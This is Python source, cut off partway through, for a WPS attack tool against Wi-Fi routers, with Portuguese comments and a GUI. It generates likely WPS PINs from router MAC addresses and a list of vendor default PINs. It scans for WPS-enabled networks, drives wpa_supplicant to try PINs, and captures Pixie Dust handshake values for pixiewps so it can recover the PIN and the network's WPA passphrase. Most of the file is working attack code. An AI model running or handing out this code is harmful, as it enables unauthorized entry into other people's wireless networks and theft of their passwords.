#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPS Attack Pin Tool — Multi-Platform (Linux / Windows 10/11)
Green Edition — Fundo Preto + Tema Verde
"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import csv
import json
import threading
import queue
import platform
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional, List, Tuple
from collections import deque
import statistics

OS_NAME = platform.system().lower()
IS_LINUX = OS_NAME == 'linux'
IS_WINDOWS = OS_NAME == 'windows'

if IS_WINDOWS:
    try:
        import tkinter as tk
        from tkinter import ttk, messagebox, scrolledtext, filedialog
        import tkinter.font as tkfont
    except ImportError:
        sys.stderr.write('Erro: tkinter nao encontrado no Windows. Instale Python com Tkinter.\n')
        sys.exit(1)
else:
    import tkinter as tk
    from tkinter import ttk, messagebox, scrolledtext, filedialog
    import tkinter.font as tkfont

# ============================================================
# CORES ANSI PARA TERMINAL
# ============================================================

ANSI_RESET = '\033[0m'
ANSI_BOLD = '\033[1m'
ANSI_RED = '\033[91m'
ANSI_GREEN = '\033[92m'
ANSI_YELLOW = '\033[93m'
ANSI_BLUE = '\033[94m'
ANSI_MAGENTA = '\033[95m'
ANSI_CYAN = '\033[96m'
ANSI_WHITE = '\033[97m'
ANSI_BG_RED = '\033[101m'
ANSI_BG_GREEN = '\033[102m'
ANSI_BG_YELLOW = '\033[103m'
ANSI_BG_BLUE = '\033[104m'
ANSI_BG_MAGENTA = '\033[105m'
ANSI_BG_CYAN = '\033[106m'

def colorize(text, color=ANSI_GREEN, bold=False):
    b = ANSI_BOLD if bold else ''
    return f'{b}{color}{text}{ANSI_RESET}'

def color_signal(dbm):
    try:
        val = int(dbm)
        if val >= -50:
            return ANSI_BG_GREEN + ANSI_WHITE
        elif val >= -67:
            return ANSI_BG_GREEN
        elif val >= -70:
            return ANSI_YELLOW
        elif val >= -80:
            return ANSI_MAGENTA
        else:
            return ANSI_RED
    except:
        return ANSI_WHITE

# ============================================================
# CLASSES ORIGINAIS
# ============================================================

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self): return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self): return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self): return self.integer
    def __str__(self): return self.string
    def __iadd__(self, other): self.integer += other
    def __isub__(self, other): self.integer -= other
    def __eq__(self, other): return self.integer == other.integer
    def __ne__(self, other): return self.integer != other.integer
    def __lt__(self, other): return self.integer < other.integer
    def __gt__(self, other): return self.integer > other.integer

    @staticmethod
    def _mac2int(mac): return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(self._str_repr, self._int_repr)


class WPSpin:
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}
        }

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {'id': ID}
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {'id': ID}
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        return [self.generate(algo, mac) for algo in self._suggest(mac)]

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        return res[0] if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac): return mac.integer & 0xFFFFFF
    def pin28(self, mac): return mac.integer & 0xFFFFFFF
    def pin32(self, mac): return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) + ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) + (((b[4] + b[5]) % 10) * 100) \
             + (((b[3] + b[4]) % 10) * 1000) + (((b[2] + b[3]) % 10) * 10000) \
             + (((b[1] + b[2]) % 10) * 100000) + (((b[0] + b[1]) % 10) * 1000000)
        return pin


class PixiewpsData:
    def __init__(self):
        self.pke = self.pkr = self.e_hash1 = self.e_hash2 = self.authkey = self.e_nonce = ''
    def clear(self): self.__init__()
    def got_all(self):
        return all([self.pke, self.pkr, self.e_nonce, self.authkey, self.e_hash1, self.e_hash2])
    def get_pixie_cmd(self, full_range=False):
        cmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
        if full_range: cmd += ' --force'
        return cmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
    def isFirstHalfValid(self): return self.last_m_message > 5
    def clear(self): self.__init__()


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


# ============================================================
# SCANNER MULTI-PLATAFORMA
# ============================================================

class WiFiScanner:
    def __init__(self, interface, vuln_list=None, callback_log=None):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.callback_log = callback_log

    def log(self, msg, level='i'):
        if self.callback_log:
            self.callback_log(msg, level)

    def iw_scanner(self):
        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        for line in lines:
            if line.startswith('command failed:'):
                self.log('[IW ERROR] {}'.format(line), 'e')
                return []
            line = line.strip('\t')
            m = re.match(r'BSS (\S+)( )?\(on \w+\)', line)
            if m:
                networks.append({'BSSID': m.group(1).upper(), 'Security type': 'Unknown',
                                 'WPS': False, 'WPS locked': False, 'Model': '',
                                 'Model number': '', 'Device name': '', 'ESSID': '', 'Level': 0})
                continue
            if not networks: continue
            net = networks[-1]
            m = re.match(r'SSID: (.*)', line)
            if m:
                net['ESSID'] = codecs.decode(m.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                continue
            m = re.match(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm', line)
            if m: net['Level'] = int(float(m.group(1))); continue
            m = re.match(r'(capability): (.+)', line)
            if m:
                net['Security type'] = 'WEP' if 'Privacy' in m.group(2) else 'Open'
                continue
            m = re.match(r'(RSN):\t [*] Version: (\d+)', line)
            if m:
                if net['Security type'] in ('WEP', 'Open'): net['Security type'] = 'WPA2'
                elif net['Security type'] == 'WPA': net['Security type'] = 'WPA/WPA2'
                continue
            m = re.match(r'(WPA):\t [*] Version: (\d+)', line)
            if m:
                if net['Security type'] in ('WEP', 'Open'): net['Security type'] = 'WPA'
                elif net['Security type'] == 'WPA2': net['Security type'] = 'WPA/WPA2'
                continue
            m = re.match(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)', line)
            if m: net['WPS'] = True; continue
            m = re.match(r' [*] AP setup locked: (0x[0-9]+)', line)
            if m: net['WPS locked'] = int(m.group(1), 16) != 0; continue
            m = re.match(r' [*] Model: (.*)', line)
            if m: net['Model'] = m.group(1); continue
            m = re.match(r' [*] Model Number: (.*)', line)
            if m: net['Model number'] = m.group(1); continue
            m = re.match(r' [*] Device name: (.*)', line)
            if m: net['Device name'] = m.group(1); continue
        networks = [n for n in networks if n['WPS']]
        networks.sort(key=lambda x: x['Level'], reverse=True)
        return networks

    def netsh_scanner(self):
        self.log('[WINDOWS] Escaneando com netsh wlan...')
        cmd = 'netsh wlan show networks mode=bssid'
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        current_net = None
        for line in lines:
            line = line.strip()
            m = re.match(r'SSID \d+ : (.+)', line)
            if m:
                if current_net: networks.append(current_net)
                current_net = {'BSSID': '', 'ESSID': m.group(1).strip(), 'Security type': 'Unknown',
                               'WPS': True, 'WPS locked': False, 'Model': '', 'Model number': '',
                               'Device name': '', 'Level': 0, 'Authentication': '', 'Encryption': '', 'Channel': 0}
                continue
            if current_net is None: continue
            m = re.match(r'BSSID \d+ : (.+)', line)
            if m: current_net['BSSID'] = m.group(1).upper().replace('-', ':'); continue
            m = re.match(r'(?:Sinal|Signal)\s*:\s*(\d+)%', line)
            if m: current_net['Level'] = self._percent_to_dbm(int(m.group(1))); continue
            m = re.match(r'(?:Autenticacao|Authentication)\s*:\s*(.+)', line)
            if m:
                current_net['Authentication'] = m.group(1).strip()
                if 'WPA2' in current_net['Authentication']: current_net['Security type'] = 'WPA2'
                elif 'WPA' in current_net['Authentication'] and current_net['Security type'] == 'Unknown':
                    current_net['Security type'] = 'WPA'
                elif 'Open' in current_net['Authentication']: current_net['Security type'] = 'Open'
                continue
            m = re.match(r'(?:Criptografia|Encryption)\s*:\s*(.+)', line)
            if m: current_net['Encryption'] = m.group(1).strip(); continue
            m = re.match(r'(?:Canal|Channel)\s*:\s*(\d+)', line)
            if m: current_net['Channel'] = int(m.group(1)); continue
        if current_net: networks.append(current_net)
        networks.sort(key=lambda x: x['Level'], reverse=True)
        self.log('[WINDOWS] {} redes encontradas'.format(len(networks)), 's')
        return networks

    @staticmethod
    def _percent_to_dbm(percent):
        if percent <= 0: return -100
        if percent >= 100: return -30
        return int(-30 - (70 * (100 - percent) / 100))

    def scan(self):
        if IS_LINUX: return self.iw_scanner()
        elif IS_WINDOWS: return self.netsh_scanner()
        else: return []


# ============================================================
# COMPANION (apenas Linux)
# ============================================================

class Companion:
    def __init__(self, interface, callback_log=None, bssid=''):
        self.interface = interface
        self.callback_log = callback_log
        self._running = True
        if not IS_LINUX:
            self.log('Ataque WPS requer Linux com wpa_supplicant + pixiewps', 'e')
            self._running = False
            return
        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = "{}/{}".format(self.tempdir, interface)
        self._init_wpa_supplicant()
        self.res_socket_file = "{}/{}".format(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)
        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        user_home = str(pathlib.Path.home())
        self.sessions_dir = '{}/.OneShot/sessions/'.format(user_home)
        self.pixiewps_dir = '{}/.OneShot/pixiewps/'.format(user_home)
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        for d in [self.sessions_dir, self.pixiewps_dir]:
            if not os.path.exists(d): os.makedirs(d)
        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0

    def stop(self): self._running = False

    def log(self, msg, level='i'):
        if self.callback_log: self.callback_log(msg, level)

    def _init_wpa_supplicant(self):
        self.log('Iniciando wpa_supplicant...')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        timeout_start = time.time()
        while self._running:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant retornou erro: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path): break
            if time.time() - timeout_start > 15: raise TimeoutError('Timeout wpa_supplicant')
            time.sleep(.1)

    def sendOnly(self, command):
        if self._running: self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        if not self._running: return ''
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        b, address = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def _explain_wpas_not_ok_status(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')) and respond == 'UNKNOWN COMMAND':
            return 'wpa_supplicant compilado sem suporte WPS. Recompile com CONFIG_WPS=y.'
        return 'Erro inesperado do wpa_supplicant'

    def _handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=True, bssid=""):
        if not self._running: return False
        line = self.wpas.stdout.readline()
        if not line: self.wpas.wait(); return False
        line = line.rstrip('\n')
        if verbose: self.log(line, 'd')
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.log('Enviando WPS Message M{}...'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.log('Recebido WPS Message M{}'.format(n))
                if n == 5: self.log('[!] Primeira metade do PIN e valida!', 's')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.log('[X] WSC NACK recebido - PIN errado', 'e')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode: self.log('E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode: self.log('PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode: self.log('PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode: self.log('AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode: self.log('E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode: self.log('E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line and '-> SCANNING' in line:
            self.connection_status.status = 'scanning'
            self.log('Escaneando...')
        elif ('WPS-FAIL' in line) and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'
            self.log('wpa_supplicant retornou WPS-FAIL', 'e')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.log('Autenticando...')
        elif 'Authentication response' in line: self.log('Autenticado')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.log('Associando com o AP...')
        elif ('Associated with' in line) and self.interface in line:
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.log('Associado com {} (ESSID: {})'.format(bssid, self.connection_status.essid), 's')
            else: self.log('Associado com {}'.format(bssid), 's')
            self.connection_status.status = 'associated'
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.log('Enviando EAPOL Start...')
        elif 'EAP entering state IDENTITY' in line: self.log('Recebido Identity Request')
        elif 'using real identity' in line: self.log('Enviando Identity Response...')
        elif self.bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and 'selected BSS ' in line:
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            self.log('AP selecionado: {}'.format(bssid))
        elif bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            noise = line.split("noise=")[1].split(" ")[0] if 'noise=' in line else ''
            if noise: self.log('Sinal: {}, Ruido: {}'.format(signal, noise))
            else: self.log('Sinal: {}'.format(signal))
        return True

    def _runPixiewps(self, showcmd=False, full_range=False):
        self.log('Executando Pixiewps...')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd: self.log(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=sys.stdout, encoding='utf-8', errors='replace')
        self.log(r.stdout)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if '[+]' in line and 'WPS pin' in line:
                    pin = line.split(':')[-1].strip()
                    return "''" if pin == '<empty>' else pin
        return False

    def _wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=True):
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)
        if pbc_mode:
            cmd = 'WPS_PBC {}'.format(bssid) if bssid else 'WPS_PBC'
            self.log("Conectando via WPS PBC...")
        else:
            cmd = 'WPS_REG {} {}'.format(bssid, pin)
            self.log("Testando PIN '{}'...".format(pin))
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
